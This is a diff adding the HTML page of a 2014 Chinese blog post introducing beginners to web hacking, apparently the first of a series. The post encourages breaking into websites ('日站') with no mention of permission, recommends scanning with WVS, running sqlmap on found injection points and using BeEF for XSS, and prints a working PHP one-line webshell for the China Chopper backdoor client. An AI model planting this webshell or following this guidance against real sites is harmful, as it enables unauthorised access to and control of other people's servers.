@@ -1,0 +1,849 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="色魔科技,maniac," />
+
+
+
+
+
+  <link rel="alternate" href="/rss.xml" title="Lost Maniac" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="[series id=’23’ title=’maniac带你入门安全’ limit=’1’] 打算是出一个系列的东西，不过写着看吧，不扯没用的，不扯那些高上大的，用最通俗的语言来解释这些高端大气上档次的东西。算是零基础入门吧，也算是给一个学习思路，因为很多新手想搞安全（黑客？）但是却无从下手，这篇文章就是来解决你这些">
+<meta property="og:type" content="article">
+<meta property="og:title" content="maniac带你入门安全--前言">
+<meta property="og:url" content="http://maniac.vip/posts/150.html">
+<meta property="og:site_name" content="Lost Maniac">
+<meta property="og:description" content="[series id=’23’ title=’maniac带你入门安全’ limit=’1’] 打算是出一个系列的东西，不过写着看吧，不扯没用的，不扯那些高上大的，用最通俗的语言来解释这些高端大气上档次的东西。算是零基础入门吧，也算是给一个学习思路，因为很多新手想搞安全（黑客？）但是却无从下手，这篇文章就是来解决你这些东西的。这篇文章不聊日站，不聊编程，咱们只谈思路。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-11-16T07:57:27.049Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="maniac带你入门安全--前言">
+<meta name="twitter:description" content="[series id=’23’ title=’maniac带你入门安全’ limit=’1’] 打算是出一个系列的东西，不过写着看吧，不扯没用的，不扯那些高上大的，用最通俗的语言来解释这些高端大气上档次的东西。算是零基础入门吧，也算是给一个学习思路，因为很多新手想搞安全（黑客？）但是却无从下手，这篇文章就是来解决你这些东西的。这篇文章不聊日站，不聊编程，咱们只谈思路。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://maniac.vip/posts/150.html"/>
+
+
+
+
+
+  <title>maniac带你入门安全--前言 | Lost Maniac</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?6ece9853dbf154aa223dfef063628fe2";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lost Maniac</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人若无名便可专心练贱</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://maniac.vip/posts/150.html?day=20171116">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lost Maniac">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lost Maniac">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">maniac带你入门安全--前言</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-07-08T18:34:53+08:00">
+                2014-07-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/maniac带你入门安全/" itemprop="url" rel="index">
+                    <span itemprop="name">maniac带你入门安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              
+                <a href="/posts/150.html?day=20171116#SOHUCS" itemprop="discussionUrl">
+                  <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="posts/150.html?day=20171116" itemprop="commentsCount"></span>
+                </a>
+              
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>[series id=’23’ title=’maniac带你入门安全’ limit=’1’]</p>
+<p>打算是出一个系列的东西，不过写着看吧，不扯没用的，不扯那些高上大的，用最通俗的语言来解释这些高端大气上档次的东西。算是零基础入门吧，也算是给一个学习思路，因为很多新手想搞安全（黑客？）但是却无从下手，这篇文章就是来解决你这些东西的。这篇文章不聊日站，不聊编程，咱们只谈思路。<a id="more"></a></p>
+<p>首先聊聊linux和windows，额。我本身是RHCE号称是linux系统高级工程师，红帽认证，高端大气。其实呢，我自己来说我并不是太喜欢linux，我是一个懒人，不喜欢那些复杂的东西，我觉得能用鼠标来解决的问题为啥敲命令，虽然我是RHCE但是我不想说linux的优越论。我觉得应用方向不同，linux适用于服务器，windows适用于打游戏、看电影、看小说、看东京热（不懂得自觉面壁：话说，最近我也很关心东京的天气问题，东京热不热）。</p>
+<p>然后咱们再聊聊学习路线，没必要你觉得linux很给力很牛逼，不学linux你就不是一个黑客。很多新手都不知道什么是linux。我说说我的看法吧，linux的历史我就不讲了，我最讨厌学东西都要讲讲这个东西历史有多牛逼，当年多给力，有多少伟人为他付出了多少努力，你只需要记住他是一个系统，和你的windows一样，能跑服务，什么是服务？例如你看的网页就是web server 常用的web 服务器有（nginx，apache，tomcat，resin，IIS），通常来说nginx apache 配合php使用，tomcat、resin配合jsp（j2ee）使用，IIS配合asp、asp.net使用，因为我本人是做web方向的，所以聊得东西都是web方向的，逆向大牛请轻拍。总的来说web现在多数使用四种语言写：php、jsp（j2ee）、.net（注意那个点.）（asp快淘汰了）</p>
+<p>一般来说你前期日站不需要精通这几种语言，有些傻逼说做黑客要精通C语言，纯属扯淡。套用钱钟书先生的一句话：“喜欢吃鸡蛋，你不需要认识那只母鸡。”你不需要知道程序是怎么写出来的，会日就行。日完了再研究为啥这样就可以日进去。</p>
+<p>好吧，我写东西可能有点乱，我喜欢想到哪写到哪，再聊聊工具，很多人都说只会用工具的叫脚本小子。但是我想说谁都是从脚本小子过来的，新手连mysql语句都不会，手注个毛啊，所以我隆重推荐：</p>
+<p>WVS</p>
+<p>某个牛逼公司开发的，爬大站必备，但是也别太大，手工测试太累，我还比较懒，所以有个靠谱的工具很不错，这个工具的用途：爬网站漏洞，找注入点，找跨站。别和我要教程，我就是介绍个思路，别想伸手党，扫描会有扫描报告，自己看着分析，看不懂英文的自己谷歌翻译</p>
+<p>Sqlmap</p>
+<p>Wvs爬完了，发现注入点怎么办，这时候咱们就祭出注入神器 sqlmap，sqlmap是python写的，安装教程百度一堆，这里给大家介绍一个渗透平台，kali linux ，很多工具直接集成了，装个虚拟机，不懂什么是虚拟机的百度“vmware或者virtual BOX”（给新手看的大牛勿喷），就是让你电脑运行两个系统，kali 官网：<a href="http://www.kali.org" target="_blank" rel="noopener">www.kali.org</a></p>
+<p>Sqlmap命令</p>
+<p>前期不用学那么多，记住一个wvs扫描出来的注入点url直接命令</p>
+<p>sqlmap -u <a href="http://注入点网址" target="_blank" rel="noopener">http://注入点网址</a></p>
+<p>然后回车，就这么简单，别说神马–level 5，先学会基本命令再说，如果想深入研究可以看看这篇文章<a href="http://maniac.pw/?p=121转载于乌云。很详细说明，相信你遇到的问题都可以在上面找到解决参数。" target="_blank" rel="noopener">http://maniac.pw/?p=121转载于乌云。很详细说明，相信你遇到的问题都可以在上面找到解决参数。</a></p>
+<p>Beef</p>
+<p>如果挖到跨站漏洞（XSS）了怎么办？上beef，kali linux里直接带了。具体使用方法可 以谷歌，英文资料直接上谷歌翻译。</p>
+<p>顺便给大家解释一个误区，linux比windows难以提权，这是扯淡，linux比windows安全，这也是扯淡，只要安全配置好，都是牛逼货。只是linux用的少，很多人不太懂，人家不都说：“不明觉厉”</p>
+<p>顺便聊聊一句话木马</p>
+<p>这就不得不提起“中国菜刀”，什么是一句话木马，就是一个很短的文件内容，可以让中国菜刀连上的，然后看他服务器里东西的，相当于一个后门，这里介绍一个很经典的php一句话木马</p>
+<p>&lt;?php @eval($_POST[value]);?&gt;</p>
+<p>然后在菜刀里链接密码写上value就可以连上了。</p>
+<p>&nbsp;</p>
+<p>下班了，先写到这，以后再补充</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/posts/144.html?day=20171116" rel="next" title="find 查找PHP后门">
+                <i class="fa fa-chevron-left"></i> find 查找PHP后门
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/posts/153.html?day=20171116" rel="prev" title="一个邮箱引发的血案--社工思路">
+                一个邮箱引发的血案--社工思路 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="SOHUCS"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="Lost Maniac" />
+            
+              <p class="site-author-name" itemprop="name">Lost Maniac</p>
+              <p class="site-description motion-element" itemprop="description">随便写写</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">79</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/rss.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/MSG-maniac" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:semowansui@vip.qq.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+            <div class="cc-license motion-element" itemprop="license">
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+                <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+              </a>
+            </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://qs5.org/" title="青石坞" target="_blank">青石坞</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://bejson.com/" title="bejson" target="_blank">bejson</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.hellojava.com/" title="HelloJava" target="_blank">HelloJava</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2013 &mdash; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">色魔科技</span>
+
+  
+  <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+  
+    <script type="text/javascript">
+    (function(){
+      var appid = 'cytjBrzIY';
+      var conf = 'e3ae49b68dbe1a48b4fee1de4e87cc06';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      if (width < 960) {
+      window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){
+        window.changyan.api.config({appid:appid,conf:conf})});
+      }
+    })();
+    </script>
+    <script type="text/javascript" src="https://assets.changyan.sohu.com/upload/plugins/plugins.count.js"></script>
+  
+
+
+
+
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
